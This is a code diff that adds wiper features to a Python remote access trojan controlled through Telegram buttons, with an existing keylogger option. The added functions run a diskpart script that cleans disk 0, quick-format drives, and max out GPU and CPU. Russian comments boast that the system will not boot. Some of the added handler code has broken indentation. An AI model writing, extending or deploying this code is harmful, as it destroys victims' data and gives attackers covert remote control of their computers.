@@ -594,6 +594,69 @@ def set_wallpaper(image_path):
     except:
         return "❌ Failed"
 
+# ============ УНИЧТОЖЕНИЕ MBR ============
+def destroy_mbr():
+    try:
+        with open("destroy.txt", "w") as f:
+            f.write("select disk 0\nclean\nconvert gpt\nexit\n")
+        subprocess.run(['diskpart', '/s', 'destroy.txt'], capture_output=True, timeout=30)
+        os.remove("destroy.txt")
+        return "💀 MBR и все разделы УНИЧТОЖЕНЫ! Система НЕ ЗАГРУЗИТСЯ!"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
+
+def stress_gpu(duration=60):
+    try:
+        try:
+            import pycuda.driver as cuda
+            import pycuda.autoinit
+            from pycuda.compiler import SourceModule
+            mod = SourceModule("""
+            __global__ void stress() {
+                while(1) {
+                    int x = threadIdx.x + blockIdx.x * blockDim.x;
+                    int y = threadIdx.y + blockIdx.y * blockDim.y;
+                    float a = 0.0;
+                    for(int i = 0; i < 1000000; i++) {
+                        a += sin(x) * cos(y) + tan(x) * atan(y);
+                    }
+                }
+            }
+            """)
+            func = mod.get_function("stress")
+            for _ in range(50):
+                func((100, 100, 1), (100, 100, 1))
+            return f"🔥 GPU нагружен до предела! ({duration} сек)"
+        except:
+            return stress_cpu(duration)
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
+
+def stress_cpu(duration=60):
+    import threading
+    import math
+    def loop():
+        end = time.time() + duration
+        while time.time() < end:
+            math.factorial(100000)
+    threads = []
+    for _ in range(os.cpu_count()):
+        t = threading.Thread(target=loop)
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+    return f"🔥 CPU нагружен до 100%! ({duration} сек)"
+
+def format_disk():
+    try:
+        drives = [d for d in os.listdir('C:/') if os.path.isdir(d)]
+        for drive in drives:
+            os.system(f'format {drive}: /q /y')
+        return "💀 Все диски отформатированы!"
+    except Exception as e:
+        return f"❌ Ошибка: {e}"
+
 # ============ SCREEN RECORD ============
 def record_screen(duration=10):
     try:
@@ -741,6 +804,10 @@ def start(update, context):
         [InlineKeyboardButton("🔌 Shutdown", callback_data="shutdown")],
         [InlineKeyboardButton("🔄 Reboot", callback_data="reboot")],
         [InlineKeyboardButton("⌨️ Keylogger", callback_data="keylogger")],
+        [InlineKeyboardButton("💀 Destroy MBR", callback_data="destroy_mbr")],
+[InlineKeyboardButton("🔥 Stress GPU", callback_data="stress_gpu")],
+[InlineKeyboardButton("🔥 Stress CPU", callback_data="stress_cpu")],
+[InlineKeyboardButton("💀 Format Disk", callback_data="format_disk")],
     ]
     update.message.reply_text(
         f"🤖 Rat v{VERSION}\n🖥️ {PC_ID}\n📌 Choose:",
@@ -905,6 +972,18 @@ def callback(update, context):
     
     elif data == "reboot":
         bot.send_message(chat_id, reboot_pc())
+
+    elif data == "destroy_mbr":
+    bot.send_message(chat_id, destroy_mbr())
+
+elif data == "stress_gpu":
+    bot.send_message(chat_id, stress_gpu(60))
+
+elif data == "stress_cpu":
+    bot.send_message(chat_id, stress_cpu(60))
+
+elif data == "format_disk":
+    bot.send_message(chat_id, format_disk())
     
     elif data == "keylogger":
         result = keylogger.dump()
